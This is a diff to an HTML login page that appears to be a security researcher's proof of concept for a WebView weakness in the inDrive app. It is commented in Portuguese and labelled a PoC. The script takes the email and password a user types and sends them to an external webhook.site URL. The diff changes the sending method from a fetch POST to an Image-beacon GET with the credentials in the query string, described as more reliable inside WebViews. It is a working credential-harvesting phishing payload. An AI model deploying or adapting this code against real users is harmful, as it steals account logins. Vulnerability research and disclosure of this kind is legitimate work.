@@ -8,9 +8,8 @@
         .box { max-width: 420px; margin: 40px auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.15); text-align: center; }
         h1 { margin: 0 0 10px; font-size: 26px; }
         p { color: #555; margin-bottom: 25px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 17px; }
         button { width: 100%; padding: 14px; background: #0078d4; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
-        button:hover { background: #0068b7; }
         .demo { background: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; margin-bottom: 25px; font-size: 15px; }
         .success { margin-top: 25px; padding: 15px; background: #d4edda; color: #155724; border-radius: 8px; display: none; }
     </style>
@@ -29,12 +28,12 @@
         </form>
 
         <div id="success" class="success">
-            ✅ Credenciais enviadas com sucesso para o webhook!
+            ✅ Credenciais enviadas para o webhook.site!
         </div>
     </div>
 
     <script>
-        const webhookUrl = "https://webhook.site/c4e06d2f-8cd7-4ef7-8e49-3225dca67314";
+        const webhook = "https://webhook.site/c4e06d2f-8cd7-4ef7-8e49-3225dca67314";
 
         document.getElementById('form').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -42,26 +41,16 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Envia as credenciais via POST JSON (método mais confiável no WebView)
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    email: email,
-                    password: password,
-                    timestamp: new Date().toLocaleString('pt-BR'),
-                    source: "inDrive WebView PoC - Z Kamachi"
-                })
-            })
-            .then(() => {
-                document.getElementById('success').style.display = 'block';
-            })
-            .catch(() => {
-                // Se der erro, ainda mostra o alert
-                document.getElementById('success').style.display = 'block';
-            });
+            // Método GET simples com query string (o mais compatível com WebView)
+            const url = `${webhook}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&time=${Date.now()}`;
 
-            alert(`✅ Credenciais enviadas!\n\nEmail: ${email}\nSenha: ${password}\n\nAgora olhe na aba do webhook.site`);
+            // Envia usando Image (funciona melhor que fetch em alguns WebViews)
+            const img = new Image();
+            img.src = url;
+
+            document.getElementById('success').style.display = 'block';
+
+            alert(`✅ Enviado!\nEmail: ${email}\nSenha: ${password}\n\nOlhe agora na aba do webhook.site`);
         });
     </script>
 </body>
